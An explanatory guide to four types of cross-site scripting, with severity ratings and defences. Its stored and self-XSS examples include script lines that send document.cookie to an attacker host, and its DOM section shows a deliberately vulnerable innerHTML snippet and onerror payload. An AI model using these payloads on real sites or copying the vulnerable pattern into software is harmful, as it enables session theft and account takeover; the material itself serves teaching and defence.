# 🔥 Types of Cross-Site Scripting (XSS) Attacks — with Examples

Cross-Site Scripting (XSS) attacks come in different forms depending on **how and where the malicious script is injected and executed**. All of them aim to run unauthorized JavaScript in the victim’s browser.

Below are the four main types of XSS, explained with practical examples and their severity.

---

## 1. 📌 **Stored XSS (Persistent)**

**Severity: High** 🔥

The malicious script is **permanently stored** on the server (e.g. in a database) and executed whenever any user loads that data.

### 📦 Example:

A user posts a comment:

```html
Nice post!
<script>
  fetch("https://attacker.com?c=" + document.cookie);
</script>
```

If the server doesn’t sanitize it, then **every user who views that comment** will unknowingly run the attacker's script.

### 🧠 Common Sources:

- Comment sections
- User profiles
- Message boards

### ⚠️ Risk:

- Affects all users who view the malicious content
- Can lead to mass account takeover or defacement

---

## 2. 🧨 **Self-XSS**

**Severity: Medium** ⚠️

Self-XSS is a social engineering attack where the attacker **tricks the victim into pasting and executing malicious JavaScript code in their own browser’s developer console**.

### 📦 Example:

The attacker might say:

> "To get free features, open the console and paste this code:"

```js
fetch("https://attacker.com/steal?cookie=" + document.cookie);
```

### 🧠 Common Scenarios:

- Social media scams
- Fake reward or access pages
- Discord or browser game giveaways

### ⚠️ Risk:

- Exploits the user's trust and curiosity
- Does not require a server vulnerability
- Many browsers warn users about this

---

## 3. ✅ **Reflected XSS (Non-Persistent)**

**Severity: Medium–High** ⚠️

The malicious script is **reflected off the server** — usually via URL parameters — and executed immediately in the user's browser.

### 📦 Example:

```js
https://example.com/search?q=<script>alert('XSS')</script>
```

If the server responds with:

```html
<p>
  You searched for:
  <script>
    alert("XSS");
  </script>
</p>
```

Then the script runs immediately.

### 🧠 Common Sources:

- URL query parameters
- Form submissions
- HTTP headers

### ⚠️ Risk:

- One-time attacks via malicious links
- Often used in phishing or session stealing

---

## 4. 🧠 **DOM-Based XSS**

**Severity: Medium–High** ⚠️

The vulnerability exists **entirely in the frontend JavaScript code**. The script reads data (e.g. from `location.hash`, `location.search`) and injects it into the DOM without sanitization.

### 📦 Example:

```js
// Vulnerable code
const query = new URLSearchParams(location.search);
document.body.innerHTML = query.get("msg");
```

Attack URL:

```js
https://example.com/?msg=<img src=x onerror="alert('XSS')">
```

This directly writes unsanitized input into the DOM.

### 🧠 Common Sources:

- Client-side templating
- `innerHTML`, `document.write`, `insertAdjacentHTML`

### ⚠️ Risk:

- Harder to detect (frontend-only)
- Doesn’t require a server-side vulnerability

---

## 🛡️ Summary Table

| Type          | Stored on Server? | Triggered by User? | Example Vector           | Severity       |
| ------------- | ----------------- | ------------------ | ------------------------ | -------------- |
| Stored XSS    | ✅ Yes            | ✅ Yes             | Comments, messages       | 🔥 High        |
| Self-XSS      | ❌ No             | ✅ Yes (manual)    | Console copy-paste       | ⚠️ Medium      |
| Reflected XSS | ❌ No             | ✅ Yes             | Search query, form input | ⚠️ Medium–High |
| DOM-Based XSS | ❌ No (JS only)   | ✅ Yes             | `innerHTML`, URL parsing | ⚠️ Medium–High |

---

## ✅ Defending Against All Types

- Sanitize and escape all user input
- Use `textContent` instead of `innerHTML`
- Apply server-side and client-side input validation
- Use trusted libraries like DOMPurify
- Implement strong CSP (Content Security Policy)

> **All XSS types are dangerous** and can lead to session hijacking, phishing, data theft, or full account compromise.
